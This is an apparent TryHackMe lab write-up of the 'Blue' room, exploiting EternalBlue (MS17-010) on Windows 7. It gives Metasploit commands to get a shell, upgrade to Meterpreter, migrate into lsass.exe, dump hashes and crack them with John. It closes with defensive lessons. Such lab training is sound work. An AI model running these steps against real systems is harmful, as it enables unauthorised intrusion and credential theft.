# Blue — TryHackMe Write-up

## Room Info
- **Difficulty:** Easy  
- **Topic:** EternalBlue (MS17-010)  
- **OS:** Windows 7

---

## Background

EternalBlue was developed secretly by the **NSA** (National Security Agency).
In April 2017, a hacker group called **Shadow Brokers** leaked NSA's hacking tools to the public.
One month later, **WannaCry** ransomware used EternalBlue to infect over 200,000 machines worldwide.

---

## Vulnerability

- **CVE:** MS17-010  
- **Protocol:** SMB — Port 445  
- **Type:** Buffer overflow in SMBv1  
- **Impact:** Remote Code Execution (RCE)

By sending a malformed packet to port 445, an attacker overflows a buffer in SMBv1
and gains code execution — no credentials required.

---

## My Experience

My first reaction after running the exploit was shock.
That's it? A few commands and I'm inside a Windows machine with no credentials?
It really hit me how dangerous unpatched legacy protocols are in real environments.

The part that confused me at first was the shell type.
After exploitation I had a basic shell, and I didn't understand how to upgrade to Meterpreter.
Once I figured that out (`post/multi/manage/shell_to_meterpreter`), things clicked.

---

## Attack Flow

### 1. Exploitation
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <your-ip>
run
```

### 2. Upgrade to Meterpreter
```bash
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

### 3. Migrate to lsass.exe
```bash
migrate <lsass-pid>
```
Migrating to lsass.exe is necessary for credential dumping —
it's the process responsible for handling authentication in Windows.

### 4. Dump and crack hashes
```bash
hashdump
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## Lessons Learned

- SMBv1 on port 445 = critical attack surface. Disable it.
- lsass.exe holds the keys to the kingdom — always a migration target
- A 2017 public exploit still works on unpatched Windows machines in 2024
- The gap between "knowing the theory" and "running the exploit" is smaller than I expected
